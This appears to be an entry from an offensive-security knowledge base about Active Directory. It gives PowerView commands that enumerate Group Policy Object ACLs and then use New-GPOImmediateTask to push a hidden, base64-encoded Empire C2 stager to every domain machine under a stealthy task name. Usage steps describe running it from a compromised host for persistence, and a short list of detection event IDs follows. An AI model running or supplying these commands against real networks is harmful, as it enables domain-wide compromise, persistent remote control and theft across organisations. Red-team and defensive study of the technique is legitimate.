---
id: b2554420-f716-4c41-a2ec-43ad58d7f69e
name: PowerShell-GPO-Enumeration-and-Empire-Stager-Deployment
type: code
language: Powershell
verified: true
created_at: '2023-04-06T03:56:03.722903+00:00'
updated_at: '2023-04-10T20:26:34.318537+00:00'
platforms:
  - Windows
tags:
  - gpo-abuse
  - active-directory
  - persistence
  - empire-stager
validated: true
---

# PowerShell-GPO-Enumeration-and-Empire-Stager-Deployment

## Code

```powershell
# Enumerate GPO
Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}

# New-GPOImmediateTask to push an Empire stager out to machines via VulnGPO
New-GPOImmediateTask -TaskName Debugging -GPODisplayName VulnGPO -CommandArguments '-NoP -NonI -W Hidden -Enc AAAAAAA...' -Force
```

## Description

This PowerShell code snippet uses PowerView functions to first enumerate all GPOs and their ACLs to identify modifiable ones, then creates a scheduled task in a vulnerable GPO to execute a base64-encoded Empire stager. The stager establishes a C2 connection, providing persistence across domain systems.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| VulnGPO | Name of the target vulnerable GPO | VulnGPO |
| Debugging | Scheduled task name for stealth | SystemMaintenance |
| AAAAAAA... | Base64-encoded Empire stager payload | (Generated via Empire: usestager multi-launcher powershell) |

## Usage

Load PowerView on a compromised domain-joined host with sufficient privileges. Run the enumeration part to find a GPO with edit rights, then execute the second part with your encoded stager. Targets will execute on next gpupdate /force. Use in post-exploitation for AD persistence.

## Detection

- Monitor Event ID 5136/4742 for GPO/ACL changes.
- Flag scheduled tasks with PowerShell arguments in GPO XML (via Event ID 4698).
- Detect base64 PowerShell executions via Script Block Logging (Event ID 4104) or anomalous network to C2.
- Audit GPO ACLs regularly for weak permissions.

## Related

- [[procedures/Abuse-GPO-with-PowerView-to-Push-Empire-Stager]]
- [[tools/PowerView]]
- [[tools/Empire]]
